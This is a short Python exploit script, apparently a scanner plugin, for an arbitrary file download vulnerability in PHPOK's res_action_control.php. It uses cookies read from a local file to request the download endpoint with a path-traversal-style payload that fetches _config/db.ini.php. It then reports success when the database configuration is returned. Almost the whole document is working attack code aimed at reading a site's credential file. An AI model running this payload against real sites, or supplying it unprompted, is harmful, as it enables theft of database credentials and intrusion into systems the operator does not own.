#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: phpok res_action_control.php 任意文件下载(需要cookies文件)
referer: unknown
author: Lucifer
description: 参数file未经过滤进入到下载方法导致任意文件下载。
'''
import sys
import json
import requests
import warnings
from termcolor import cprint

class phpok_res_action_control_filedownload_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/admin.php?c=res_action&f=download&file=_config/db.ini.php"
        vulnurl = self.url + payload
        try:
            f =  open(r'cookies.txt', 'r')
            cookies = {}
            for line in f.read().split(";"):
                name, value = line.strip().split("=",1)
                cookies[name]=value
        except:
            pass
        try:
            req = requests.get(vulnurl, headers=headers, cookies=cookies, timeout=10, verify=False)
            if r"<?php" in req.text and r"host" in req.text:
                cprint("[+]存在phpok res_action_control.php 任意文件下载(需要cookies文件)漏洞...(高危)\tpayload: "+vulnurl+"\ncookies:"+json.dumps(cookies, indent=4), "red")

        except:
            cprint("[-] "+__file__+"====>连接超时", "cyan")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = phpok_res_action_control_filedownload_BaseVerify(sys.argv[1])
    testVuln.run()